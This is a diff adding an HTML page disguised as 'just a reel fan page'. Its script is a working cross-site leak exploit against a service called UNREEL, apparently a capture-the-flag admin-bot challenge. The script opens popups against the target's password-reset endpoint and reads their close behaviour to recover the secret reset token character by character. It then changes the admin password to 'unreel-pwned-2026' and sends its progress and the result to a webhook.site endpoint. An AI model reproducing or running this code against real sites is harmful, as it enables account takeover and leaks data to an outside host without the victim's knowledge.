@@ -1,0 +1,116 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>just a reel fan page</title>
+</head>
+<body>
+<script>
+'use strict';
+// ---- XS-Leak oracle attack on UNREEL (popup edition v4: multi-char per visit) ----
+// v3 (8+8 batched, 1 char/visit) lost the bot after ~16 visits = 15/31 chars.
+// v4 extracts up to 3 chars per visit so 31 chars need only ~11 visits:
+//   - 15 popups at once per round; the 16th hex candidate is decided by
+//     elimination (all 15 closed -> it's the skipped one)
+//   - dynamic rounds while elapsed < 6.8s (bot closes context at 10s)
+//   - incremental progress reports (fire-and-forget) + sendBeacon at the end
+//   - fully parameterized: ?t=<target> &r=<webhook-uuid> &p=<prefix>
+//     so the page is static and CDN caches are harmless.
+//   422 (prefix correct, incomplete) -> page stays    -> popup stays open
+//   403 (wrong)  -> finish() -> +2000ms -> window.close()
+
+const NEWPASS = 'unreel-pwned-2026';
+const HEX = '0123456789abcdef';
+const BUDGET_MS = 8800;      // stop starting new rounds after this
+const ROUND_DEADLINE = 5500; // per-round wait cap (backend is slow with 15 parallel)
+
+const params = new URLSearchParams(location.search);
+const TARGET = (() => {
+  const t = params.get('t') || '';
+  return /^https:\/\/[a-z0-9.-]+$/i.test(t) ? t.replace(/\/+$/, '') : '';
+})();
+const REPORT = (() => {
+  const r = params.get('r') || '';
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(r)
+    ? 'https://webhook.site/' + r : '';
+})();
+let prefix = (params.get('p') || '').replace(/[^0-9a-f]/g, '').slice(0, 31);
+
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+function payload(data) {
+  return JSON.stringify({ t: new Date().toISOString(), ...data });
+}
+async function report(data) {
+  if (!REPORT) return;
+  try {
+    await fetch(REPORT, { method: 'POST', mode: 'no-cors', body: payload(data) });
+  } catch (e) { /* best effort */ }
+}
+function reportAsync(data) { report(data); } // fire-and-forget variant
+function beacon(data) {
+  if (!REPORT) return;
+  try {
+    navigator.sendBeacon(REPORT, new Blob([payload(data)], { type: 'text/plain' }));
+  } catch (e) { /* best effort */ }
+}
+
+// One round: open `cand.length` popups simultaneously, wait until all-but-one
+// (or all) are closed or deadline, close survivors, return closed-state array.
+async function round(cand) {
+  const pops = [];
+  for (let i = 0; i < cand.length; i++) {
+    let w = null;
+    try {
+      w = window.open(
+        `${TARGET}/password/?token=${prefix}${cand[i]}&password=${encodeURIComponent(NEWPASS)}`,
+        '_blank');
+    } catch (e) { /* keep null */ }
+    pops[i] = w;
+    if (i > 0) await sleep(60); // stagger: backend chokes on 15 simultaneous loads
+  }
+  const deadline = Date.now() + ROUND_DEADLINE;
+  for (;;) {
+    const closed = pops.filter((w) => !w || w.closed).length;
+    if (closed >= cand.length - 1) break;
+    if (Date.now() > deadline) break;
+    await sleep(80);
+  }
+  await sleep(120);
+  const states = pops.map((w) => !w || w.closed);
+  pops.forEach((w) => { try { if (w && !w.closed) w.close(); } catch (e) {} });
+  return states;
+}
+
+async function runRound(final) {
+  for (let attempt = 0; attempt < 2; attempt++) {
+    const closed = await round(final ? HEX : HEX.slice(0, 15));
+    const open = closed.map((v, i) => [v, i]).filter(([v]) => !v);
+    if (open.length === 1) return HEX[open[0][1]];
+    if (open.length === 0 && !final) return 'f'; // eliminated -> skipped candidate
+    await report({ event: attempt === 0 ? 'retry' : 'oracle-fail', prefix, closed: closed.map(Number) });
+  }
+  return null;
+}
+
+(async () => {
+  if (!TARGET || !REPORT) { return; }
+  await report({ event: 'start', prefix, target: TARGET });
+  const t0 = Date.now();
+  while (prefix.length < 31 && Date.now() - t0 < BUDGET_MS) {
+    const c = await runRound(false);
+    if (c === null) break; // oracle failed; shepherd will resubmit this prefix
+    prefix += c;
+    reportAsync({ event: 'progress', prefix });
+  }
+  if (prefix.length === 31) {
+    // Final round fires all 16; the full-token POST changes the admin password.
+    await runRound(true);
+    beacon({ event: 'FINAL', password: NEWPASS });
+    return;
+  }
+  beacon({ event: 'visit-done', prefix });
+})();
+</script>
+</body>
+</html>
